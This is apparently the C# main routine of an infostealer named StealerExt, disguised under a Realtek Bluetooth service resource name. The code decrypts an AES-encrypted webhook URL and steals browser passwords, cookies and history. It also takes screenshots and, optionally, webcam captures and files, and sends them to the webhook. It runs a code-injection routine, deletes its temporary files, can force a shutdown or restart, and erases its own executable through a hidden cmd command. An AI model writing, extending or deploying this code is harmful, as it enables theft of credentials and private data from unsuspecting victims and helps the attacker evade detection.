using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Newtonsoft.Json;
using System.Reflection;
using System.Security.Cryptography;

namespace StealerExt
{
    internal static class Hook
    {
        [STAThread]
        public static void Main(string[] arg)
        {
            if (arg.Length <= 0)
                throw new ArgumentNullException(nameof(arg));
            try
            {
                var PaddedDecryptedUrl = AES128(Convert.FromBase64String(arg[0]));
                _DecryptedHook = new Uri(Encoding.ASCII.GetString(PaddedDecryptedUrl)).AbsoluteUri; 
                _DecryptedHook = _DecryptedHook.Replace("%00", "");
            }
            catch
            {
                _DecryptedHook = arg[0];
            }
            string[] resName = Assembly.GetExecutingAssembly().GetManifestResourceNames();
            for (int i = 0; i < resName.Length; i++)
                if (resName[i].ToLowerInvariant() != "rtkbtmanserv.properties.resources.resources") ExtractResources(resName[i]);
            dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config"));
            if (File.Exists(API.Temp + "\\ss.png")) File.Delete(API.Temp + "\\ss.png");
            new Stealer().StartSteal();
            MemoryStream ScreenshotStream = CurrentScreen.GetScreenshot(); 
            new API(API.wHook).SendScreenshot(ScreenshotStream);            
            if ((bool)config.cam == true) WebCamCap.wcc();
            API.Passwords();
            API.Cookies();
            API.History();
            Injection.StartInjection();
            
            if ((bool)config.files == true)
            {
                FileStealer.GetFiles();
            }
            
            try
            {
                File.Delete(API.Temp + "config"); File.Delete(API.Temp + "whysosad"); File.Delete(API.Temp + "xwizard.cfg");
            }
            catch { }
            foreach (string file in Directory.EnumerateFiles(Path.GetTempPath(), "costura.*", SearchOption.TopDirectoryOnly))
            {
                try
                {
                    File.Delete(file);
                }
                catch
                { }
            }
            
            if ((bool)config.shutdown == true)
            {
                var psi = new ProcessStartInfo("shutdown", "/s /t 3")
                {
                    CreateNoWindow = true,
                    UseShellExecute = true
                };
                Process.Start(psi);
            }
            else if ((bool)config.restart == true)
            {
                var psi = new ProcessStartInfo("shutdown", "/r /s /t 3")
                {
                    CreateNoWindow = true,
                    UseShellExecute = true
                };
                Process.Start(psi);
            }
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }
        
        public static byte[] AES128(byte[] message)
        {
            try
            {
                Aes aes = new AesManaged
                {
                    Key = new byte[] { 88, 105, 179, 95, 179, 135, 116, 246, 101, 235, 150, 231, 111, 77, 22, 131 },
                    IV = new byte[16],
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.Zeros
                };
                ICryptoTransform crypto;
                crypto = aes.CreateDecryptor();
                return crypto.TransformFinalBlock(message, 0, message.Length);
            }
            catch
            {
                return null;
            }
        }
        public static void ExtractResources(string resource)
        {
            string resourceName = resource.Replace("RtkBtManServ.Resources.", "");
            if (File.Exists(API.Temp + resourceName)) File.Delete(API.Temp + resourceName);
            Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource);
            FileStream fileStream = new FileStream(API.Temp + resourceName, FileMode.CreateNew);
            for (int i = 0; i < stream.Length; i++)
                fileStream.WriteByte((byte)stream.ReadByte());
            fileStream.Close();
        }
        public static string _DecryptedHook;
    }
}